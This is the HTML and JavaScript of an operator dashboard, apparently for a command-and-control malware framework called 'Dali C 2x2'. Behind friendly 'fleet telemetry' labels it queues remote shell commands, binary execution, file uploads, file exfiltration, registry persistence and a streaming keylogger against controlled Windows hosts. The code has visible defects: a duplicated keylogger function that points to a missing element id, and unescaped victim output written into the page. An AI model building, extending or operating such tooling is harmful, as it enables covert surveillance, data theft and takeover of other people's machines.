<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Dali C 2x2 | Premium Dashboard</title>
    <link rel="stylesheet" href="/static/style.css?v=1.3" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&family=JetBrains+Mono&display=swap"
      rel="stylesheet"
    />
  </head>
  <body>
    <div class="layout">
      <!-- Sidebar -->
      <div class="sidebar">
        <div class="logo">
          <svg
            width="28"
            height="28"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2.5"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <path d="M12 2a10 10 0 1 0 10 10H12V2z" />
            <path d="M12 12L2.7 7.3" />
            <path d="M12 12V22" />
            <path d="M12 12L21.3 7.3" />
          </svg>
          Dali <span>C 2x2</span>
        </div>
        <div
          style="
            font-size: 0.7rem;
            color: var(--text-muted);
            margin-bottom: 1rem;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            font-weight: 700;
          "
        >
          Inventory Nodes
        </div>
        <div id="agent-list">
          <p style="color: var(--text-muted)">Scanning fleet...</p>
        </div>
      </div>

      <!-- Main Area -->
      <div class="main-content">
        <!-- Stats Bar -->
        <div class="stats-container">
          <div class="stat-card">
            <span class="stat-label">Active Fleet</span>
            <span class="stat-value" id="stat-online">0</span>
          </div>
          <div class="stat-card">
            <span class="stat-label">Total Jobs</span>
            <span class="stat-value" id="stat-tasks">0</span>
          </div>
          <div class="stat-card">
            <span class="stat-label">Queue Load</span>
            <span class="stat-value" id="stat-pending">0</span>
          </div>
          <div class="stat-card">
            <span class="stat-label">Control Plane</span>
            <div style="display: flex; gap: 8px; margin-top: 10px">
              <button
                style="padding: 6px 12px; font-size: 0.65rem"
                onclick="exportAudit()"
              >
                Export Audit
              </button>
              <a
                href="/docs"
                target="_blank"
                style="
                  padding: 6px 12px;
                  font-size: 0.65rem;
                  background: rgba(255, 255, 255, 0.05);
                  color: var(--text-main);
                  border-radius: 1rem;
                  text-decoration: none;
                  border: 1px solid rgba(255, 255, 255, 0.1);
                  font-weight: 700;
                  display: flex;
                  align-items: center;
                "
                >API</a
              >
            </div>
          </div>
        </div>

        <div id="welcome-screen" class="glass-card">
          <h1>Dali Orchestrator</h1>
          <p
            style="
              color: var(--text-muted);
              font-size: 1.1rem;
              max-width: 600px;
            "
          >
            The central nervous system for your fleet. Select a managed node to
            begin high-concurrency job orchestration and sensor telemetry
            analysis.
          </p>
        </div>

        <!-- Orchestrator Controls -->
        <div id="agent-controls" class="glass-card" style="display: none">
          <div
            style="
              display: flex;
              justify-content: space-between;
              align-items: flex-start;
              margin-bottom: 1.5rem;
            "
          >
            <div>
              <h2
                id="active-agent-title"
                style="font-size: 1.75rem; margin-bottom: 0.25rem"
              >
                Node ID
              </h2>
              <div id="node-tags" style="display: flex; gap: 10px"></div>
            </div>
            <div style="display: flex; gap: 10px">
                <button class="btn-accent" style="background: rgba(34, 197, 94, 0.1); color: var(--success);" onclick="openTerminal()">Live Terminal</button>
                <button class="btn-accent" onclick="openKeylogger()">HID Intercept</button>
                <button class="btn-danger" onclick="deleteCurrentNode()">Terminate Node</button>
            </div>
          </div>

          <div class="task-controls">
            <select id="task-type" onchange="updatePlaceholder()">
              <option value="sysinfo">Telemetry Analysis (Sysinfo)</option>
              <option value="shell">Shell Orchestration (cmd / c)</option>
              <option value="exec">Direct Binary Execution (Exec)</option>
              <option value="upload">Deploy Artifact (Upload)</option>
              <option value="download">Exfiltrate Telemetry (Download)</option>
              <option value="persist">Persistence Vector (Registry)</option>
            </select>
            <input type="text" id="task-command" placeholder="Enter configuration payload..." style="flex-grow: 1" />
            <button id="browse-btn" style="background: rgba(255,255,255,0.05); color: white; display: none;" onclick="document.getElementById('file-input').click()">Browse...</button>
            <input type="file" id="file-input" style="display: none" onchange="onFileSelected()">
            <button onclick="sendTask()">Execute Job</button>
          </div>
        </div>

        <!-- Job History -->
        <div id="terminal-container" style="display: none">
          <div class="glass-card">
            <h2
              style="
                margin-bottom: 2rem;
                display: flex;
                align-items: center;
                gap: 10px;
              "
            >
              <svg
                width="20"
                height="20"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline>
              </svg>
              Orchestration Log
            </h2>
            <table class="job-table">
              <thead>
                <tr>
                  <th>Ref</th>
                  <th>Vector</th>
                  <th>Timestamp</th>
                  <th>Status</th>
                  <th>Outcome</th>
                </tr>
              </thead>
              <tbody id="task-history"></tbody>
            </table>
          </div>
        </div>

    <!-- Keylogger Modal -->
    <div id="keylogger-modal-backdrop" class="modal-backdrop">
        <div class="modal glass-card">
            <div class="modal-header">
                <h2 style="display: flex; align-items: center; gap: 10px;">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 9v11a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V9"/><path d="M9 22V12h6v10"/><path d="M2 10.6L12 2l10 8.6"/></svg>
                    HID Intercept
                </h2>
                <button class="btn-secondary" style="padding: 5px 10px;" onclick="closeKeylogger()">Close</button>
            </div>
            <div id="kl-log" class="kl-log-area">[*] Listener inactive...</div>
            <div class="kl-controls">
                <button id="kl-start" class="btn-accent" onclick="startKL()">Deploy Listener</button>
                <button id="kl-stop" class="btn-danger" style="display: none;" onclick="stopKL()">Terminate Listener</button>
            </div>
        </div>
    </div>

    <!-- Terminal Modal -->
    <div id="term-modal-backdrop" class="modal-backdrop">
        <div class="modal glass-card" style="max-width: 800px; padding: 0;">
            <div class="modal-header" style="padding: 1.5rem 1.5rem 0 1.5rem;">
                <h2 style="display: flex; align-items: center; gap: 10px;">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
                    Live Terminal Console
                </h2>
                <button class="btn-secondary" style="padding: 5px 10px;" onclick="closeTerminal()">Close</button>
            </div>
            <div class="console-wrapper" style="border: none; border-radius: 0; height: 550px;">
                <div id="console-output" class="console-output">
                    <div style="color: grey;">[*] Terminal initialized. Ready for commands.</div>
                </div>
                <div class="console-input-area">
                    <span class="console-prompt">></span>
                    <input type="text" id="console-input" class="console-input" autofocus placeholder="Type a command..." onkeydown="handleConsoleInput(event)">
                </div>
            </div>
        </div>
    </div>

    <script>
      let activeAgentId = null;
      let selectedFileData = null;
      const accessToken = localStorage.getItem("access_token");

      if (!accessToken) {
        window.location.href = "/login";
      }

      async function apiFetch(url, options = {}) {
        options.headers = {
          ...options.headers,
          Authorization: `Bearer ${accessToken}`,
          "Content-Type": "application/json",
        };
        const response = await fetch(url, options);
        if (response.status === 401) {
          localStorage.removeItem("access_token");
          window.location.href = "/login";
        }
        return response;
      }

      async function fetchStats() {
        try {
          const res = await apiFetch("/api/stats");
          const stats = await res.json();
          document.getElementById("stat-online").innerText =
            stats.online_agents;
          document.getElementById("stat-tasks").innerText = stats.total_tasks;
          document.getElementById("stat-pending").innerText =
            stats.pending_tasks;
        } catch (e) {}
      }

      async function fetchAgents() {
        try {
          const res = await apiFetch("/api/agents");
          const agents = await res.json();
          const list = document.getElementById("agent-list");
          list.innerHTML = "";

          agents.forEach((agent) => {
            const div = document.createElement("div");
            div.className = `agent-item ${
              agent.id === activeAgentId ? "active" : ""
            }`;
            div.onclick = () => selectAgent(agent);
            const isOnline = agent.status === "online";
            const displayName = agent.info?.user || agent.id.substring(0, 8);
            const displayIp = agent.info?.ip || "0.0.0.0";
            div.innerHTML = `
                <div class="agent-id">Node::${displayName}</div>
                <div class="agent-status" style="color: ${
                  isOnline ? "var(--success)" : "var(--text-muted)"
                }">
                    <span class="status-dot ${
                      isOnline ? "status-online" : "status-offline"
                    }"></span>
                    ${agent.status.toUpperCase()}
                </div>
                <div class="agent-meta">
                    <span style="color: var(--accent); font-weight: 600;">IP: ${displayIp}</span>
                    <span>OS: ${agent.info?.os || "---"}</span>
                </div>
            `;
            list.appendChild(div);
          });
        } catch (e) {}
      }

      let commandHistory = [];
      let historyIndex = -1;

      function openTerminal() {
          if (!activeAgentId) return;
          document.getElementById('term-modal-backdrop').style.display = 'flex';
          document.getElementById('console-input').focus();
      }

      function closeTerminal() {
          document.getElementById('term-modal-backdrop').style.display = 'none';
      }

      function selectAgent(agent) {
        activeAgentId = agent.id;
        document.getElementById("welcome-screen").style.display = "none";
        document.getElementById("agent-controls").style.display = "block";
        document.getElementById("terminal-container").style.display = "block";
        
        const displayName = agent.info?.user || agent.id.substring(0, 8);
        const displayIp = agent.info?.ip || '0.0.0.0';
        document.getElementById("active-agent-title").innerText = `Managed Node [${displayName} @ ${displayIp}]`;
        
        const tags = document.getElementById("node-tags");
        tags.innerHTML = `
            <span class="badge" style="background: rgba(255,255,255,0.05)">${agent.info?.user || 'Unknown'}</span>
            <span class="badge" style="background: rgba(56,189,248,0.1); color: var(--accent)">${displayIp}</span>
            <span class="badge" style="background: rgba(34, 197, 94, 0.1); color: var(--success)">${agent.info?.os || 'OS'}</span>
        `;

        fetchAgents();
        fetchHistory();
      }

      function openKeylogger() {
          if (!activeAgentId) return;
          document.getElementById('keylogger-modal-backdrop').style.display = 'flex';
          startKLPolling();
      }

      function closeKeylogger() {
          document.getElementById('keylogger-modal-backdrop').style.display = 'none';
          if (klInterval) clearInterval(klInterval);
      }

      function handleConsoleInput(event) {
        const input = event.target;
        if (event.key === "Enter") {
          const cmd = input.value.trim();
          if (cmd) {
            commandHistory.push(cmd);
            historyIndex = commandHistory.length;
            appendToConsole(
              `<span style="color: var(--accent)">> ${cmd}</span>`
            );
            sendTaskToNode("shell", cmd);
            input.value = "";
          }
        } else if (event.key === "ArrowUp") {
          if (historyIndex > 0) {
            historyIndex--;
            input.value = commandHistory[historyIndex];
          }
        } else if (event.key === "ArrowDown") {
          if (historyIndex < commandHistory.length - 1) {
            historyIndex++;
            input.value = commandHistory[historyIndex];
          } else {
            historyIndex = commandHistory.length;
            input.value = "";
          }
        }
      }

      function appendToConsole(html) {
        const out = document.getElementById("console-output");
        const div = document.createElement("div");
        div.innerHTML = html;
        out.appendChild(div);
        out.scrollTop = out.scrollHeight;
      }

      async function sendTaskToNode(type, cmd) {
        if (!activeAgentId) return;
        try {
          await apiFetch(`/operator/tasks`, {
            method: "POST",
            body: JSON.stringify({
              agent_id: activeAgentId,
              task_type: type,
              command: cmd,
            }),
          });
        } catch (e) {
          appendToConsole(
            `<span style="color: var(--danger)">[!] Failed to send task</span>`
          );
        }
      }

      async function deleteCurrentNode() {
        if (!activeAgentId) return;
        if (
          !confirm(
            `Are you sure you want to terminate Node ${activeAgentId.substring(
              0,
              8
            )}? This will remove all associated logs.`
          )
        )
          return;

        try {
          const res = await apiFetch(`/api/agents/${activeAgentId}`, {
            method: "DELETE",
          });
          if (res.ok) {
            activeAgentId = null;
            document.getElementById("agent-controls").style.display = "none";
            document.getElementById("terminal-container").style.display =
              "none";
            document.getElementById("welcome-screen").style.display = "flex";
            fetchAgents();
            fetchStats();
          }
        } catch (e) {
          alert("Termination failed");
        }
      }

      async function fetchHistory() {
        if (!activeAgentId) return;
        try {
          const res = await apiFetch(`/api/tasks/${activeAgentId}`);
          const tasks = await res.json();
          const container = document.getElementById("task-history");
          container.innerHTML = "";

          tasks.forEach((task) => {
            const row = document.createElement("tr");
            let outcome = `<i style="color: var(--text-muted)">Awaiting execution...</i>`;

            if (task.status === "leased") {
              outcome = `<span style="color: var(--accent)">Node processing...</span>`;
            } else if (task.status === "failed") {
              outcome = `<div class="result-block" style="border-color: var(--danger)">${
                task.result?.error || "Execution Error"
              }</div>`;
            } else if (
              task.status === "completed" &&
              task.type === "download" &&
              task.result?.content
            ) {
              const filename = task.result.filename || "downloaded_file";
              outcome = `
                    <div style="display: flex; align-items: center; gap: 10px;">
                        <span style="color: var(--success)">File ready (${(
                          task.result.size / 1024
                        ).toFixed(1)} KB)</span>
                        <button onclick="downloadBlob('${
                          task.result.content
                        }', '${filename}')" style="padding: 4px 10px; font-size: 0.7rem;">Save File</button>
                    </div>
                `;
            } else if (
              task.status === "completed" &&
              task.type === "keylogger" &&
              task.result?.log
            ) {
              outcome = `
                    <div style="color: #fbbf24; font-weight: 700; margin-bottom: 5px;">HID Exfiltration Data:</div>
                    <div class="result-block" style="white-space: pre-wrap; color: #fcd34d;">${task.result.log}</div>
                `;
            } else if (task.result) {
              const out =
                task.result.stdout ||
                JSON.stringify(task.result.info || task.result, null, 2);
              outcome = `<div class="result-block">${out}</div>`;
            }

            row.innerHTML = `
                <td><code style="color: var(--accent)">#${task.id.substring(
                  0,
                  4
                )}</code></td>
                <td><b style="font-size: 0.75rem">${task.type.toUpperCase()}</b></td>
                <td style="font-size: 0.75rem; color: var(--text-muted)">${new Date(
                  task.created_at
                ).toLocaleTimeString()}</td>
                <td><span class="badge badge-${task.status}">${
              task.status
            }</span></td>
                <td>${outcome}</td>
            `;
            container.appendChild(row);
          });
        } catch (e) {}
      }

      function downloadBlob(base64, filename) {
        const link = document.createElement("a");
        link.href = "data:application/octet-stream;base64," + base64;
        link.download = filename;
        link.click();
      }

      function updatePlaceholder() {
        const type = document.getElementById("task-type").value;
        const input = document.getElementById("task-command");
        const browseBtn = document.getElementById("browse-btn");

        browseBtn.style.display = type === "upload" ? "inline-block" : "none";

        const mapping = {
          sysinfo: "Telemetry analysis (no input required)...",
          shell: "System command (e.g. whoami or net user)...",
          exec: "Direct binary path (e.g. C:\\Windows\\System32\\calc.exe)...",
          upload: "Destination folder (e.g. C:\\Windows\\temp\\)...",
          download:
            "Remote file path to exfiltrate (e.g. C:\\Users\\Public\\secret.txt)...",
          persist: "Registry key name for persistence (optional)...",
          keylogger: "Action (start/stop/dump) and optional duration...",
        };
        input.placeholder = mapping[type] || "Enter configuration payload...";
      }

      function onFileSelected() {
        const file = document.getElementById("file-input").files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onload = function (e) {
          selectedFileData = {
            filename: file.name,
            content: e.target.result.split(",")[1],
            size: file.size,
          };
          document.getElementById("task-command").value =
            "Ready to upload: " + file.name;
        };
        reader.readAsDataURL(file);
      }

      async function sendTask() {
        const type = document.getElementById("task-type").value;
        const command = document.getElementById("task-command").value;
        if (!activeAgentId) return;

        let taskReq = {
          agent_id: activeAgentId,
          task_type: type,
        };

        if (type === "keylogger") {
          const parts = command.split(" ");
          taskReq.payload = {
            action: parts[0] || "start",
            duration: parseInt(parts[1]) || 30,
          };
        } else if (type === "upload" && selectedFileData) {
          let destPath = command
            .replace("Ready to upload: " + selectedFileData.filename, "")
            .trim();
          if (!destPath) destPath = "C:\\Windows\\Temp\\";
          taskReq.payload = {
            filename: selectedFileData.filename,
            content: selectedFileData.content,
            path: destPath,
          };
          selectedFileData = null;
          document.getElementById("file-input").value = "";
        } else {
          taskReq.command = command;
        }

        try {
          await apiFetch(`/operator/tasks`, {
            method: "POST",
            body: JSON.stringify(taskReq),
          });
          document.getElementById("task-command").value = "";
          fetchHistory();
        } catch (e) {
          alert("Execution failed");
        }
      }

      async function exportAudit() {
        try {
          const res = await apiFetch("/api/tasks/export");
          const blob = await res.blob();
          const url = window.URL.createObjectURL(blob);
          const a = document.createElement("a");
          a.href = url;
          a.download = "fleet_audit_log.csv";
          document.body.appendChild(a);
          a.click();
          a.remove();
        } catch (e) {
          alert("Export failed");
        }
      }

      function connectWebSocket() {
        const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
        const ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
        ws.onmessage = (event) => {
          const data = JSON.parse(event.data);
          fetchAgents();
          fetchStats();
          if (
            activeAgentId &&
            (data.agent_id === activeAgentId || data.event === "agent_deleted")
          ) {
            if (
              data.event === "agent_deleted" &&
              data.agent_id === activeAgentId
            ) {
              activeAgentId = null;
              location.reload();
            } else if (data.event === "task_updated") {
              fetchHistory();
              // For console mode, if the updated task is a shell task, we can show it in console
              // But we need to fetch the result. We'll let fetchHistory handle UI, but maybe fetch latest console line?
              checkLatestConsoleResult();
            }
          }
        };
        ws.onclose = () => setTimeout(connectWebSocket, 5000);
      }

      async function checkLatestConsoleResult() {
        const res = await apiFetch(`/api/tasks/${activeAgentId}`);
        const tasks = await res.json();
        const lastShell = tasks.find(
          (t) => t.type === "shell" && t.status === "completed"
        );
        if (lastShell && lastShell.result && !lastShell._shown_in_console) {
          const out = lastShell.result.stdout || lastShell.result.error || "";
          appendToConsole(out.replace(/\n/g, "<br>"));
          lastShell._shown_in_console = true; // Temporary flag
        }
      }

      let klInterval = null;

      function openKeylogger() {
          if (!activeAgentId) return;
          document.getElementById('kl-modal-backdrop').style.display = 'flex';
          startKLPolling();
      }

      function closeKeylogger() {
          document.getElementById('kl-modal-backdrop').style.display = 'none';
          if (klInterval) clearInterval(klInterval);
      }

      async function startKL() {
          await apiFetch(`/operator/tasks`, { 
              method: "POST", 
              body: JSON.stringify({ agent_id: activeAgentId, task_type: 'keylogger', payload: { action: 'start', duration: 0 } }) 
          });
          document.getElementById('kl-start').style.display = 'none';
          document.getElementById('kl-stop').style.display = 'inline-block';
          document.getElementById('kl-log').innerHTML += `<div style="color: grey;">[*] Listener deployed. Streaming HID data...</div>`;
      }

      async function stopKL() {
          await apiFetch(`/operator/tasks`, { 
              method: "POST", 
              body: JSON.stringify({ agent_id: activeAgentId, task_type: 'keylogger', payload: { action: 'stop' } }) 
          });
          document.getElementById('kl-start').style.display = 'inline-block';
          document.getElementById('kl-stop').style.display = 'none';
          document.getElementById('kl-log').innerHTML += `<div style="color: grey;">[*] Listener terminated.</div>`;
      }

      function startKLPolling() {
          if (klInterval) clearInterval(klInterval);
          klInterval = setInterval(async () => {
              if (!activeAgentId) return;
              // Send a dump request
              await apiFetch(`/operator/tasks`, { 
                  method: "POST", 
                  body: JSON.stringify({ agent_id: activeAgentId, task_type: 'keylogger', payload: { action: 'dump' } }) 
              });
              
              // Find the latest dump result in history
              const res = await apiFetch(`/api/tasks/${activeAgentId}`);
              const tasks = await res.json();
              const latestDump = tasks.find(t => t.type === 'keylogger' && t.status === 'completed' && t.result?.log);
              if (latestDump && latestDump.result.log && !latestDump._shown_in_kl) {
                  const area = document.getElementById('kl-log');
                  area.innerText += latestDump.result.log;
                  area.scrollTop = area.scrollHeight;
                  latestDump._shown_in_kl = true;
              }
          }, 3000);
      }

      connectWebSocket();
      fetchAgents();
      fetchStats();
    </script>
  </body>
</html>
